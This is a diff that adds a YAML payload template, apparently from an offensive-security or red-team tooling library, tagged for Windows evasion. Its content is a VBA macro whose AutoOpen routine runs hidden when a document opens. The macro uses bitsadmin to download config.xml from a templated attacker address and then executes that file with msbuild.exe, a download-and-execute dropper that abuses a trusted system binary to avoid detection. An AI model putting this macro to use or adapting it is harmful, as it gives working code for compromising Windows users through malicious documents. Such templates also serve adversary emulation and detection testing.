@@ -1,0 +1,22 @@
+---
+metadata:
+  filename: "msbuild-vba-bitsadmin.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-05-30"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  Function RunCommand(cmd As String) As Long
+      RunCommand = Shell(cmd, vbHide)
+  End Function
+
+  Sub AutoOpen()
+      Dim myURL As String
+      Dim LocalFilePath As String
+
+      myURL = "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/config.xml"
+      LocalFilePath = "{{ delivery_path_windows }}\config.xml"
+
+      RunCommand "cmd.exe /c bitsadmin /transfer myJob /download /priority normal " & myURL & " " & LocalFilePath
+      RunCommand "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe " & LocalFilePath
+  End Sub
